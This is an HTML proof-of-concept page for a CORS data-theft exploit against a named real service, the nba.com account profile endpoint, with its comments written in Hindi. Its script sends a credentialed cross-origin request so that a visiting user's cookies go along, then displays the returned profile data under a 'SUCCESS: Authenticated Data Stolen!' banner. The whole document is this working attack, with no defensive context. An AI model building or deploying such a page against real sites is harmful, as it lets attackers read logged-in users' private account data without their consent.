<!DOCTYPE html>
<html>
<body>
    <center>
        <h1>CORS Exploit: Data Exfiltration Proof</h1>
        <div id="status" style="color: blue;">Attacking core-api.nba.com...</div>
        <textarea id="result" style="width: 80%; height: 200px; margin-top: 20px;"></textarea>
    </center>

    <script>
        // स्टेप 1 में मिला हुआ असली URL यहाँ डालें
        var targetUrl = "https://www.nba.com/account/nbaprofile"; 

        var xhr = new XMLHttpRequest();
        xhr.open("GET", targetUrl, true);
        
        // यह सबसे ज़रूरी हिस्सा है - यह ब्राउज़र को कुकीज़ भेजने के लिए कहता है
        xhr.withCredentials = true; 

        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                if (xhr.status == 200) {
                    document.getElementById("status").innerHTML = "<b style='color:red;'>SUCCESS: Authenticated Data Stolen!</b>";
                    document.getElementById("result").value = xhr.responseText;
                } else {
                    document.getElementById("status").innerText = "Failed to fetch data. Status: " + xhr.status;
                }
            }
        };
        xhr.send();
    </script>
</body>
</html>
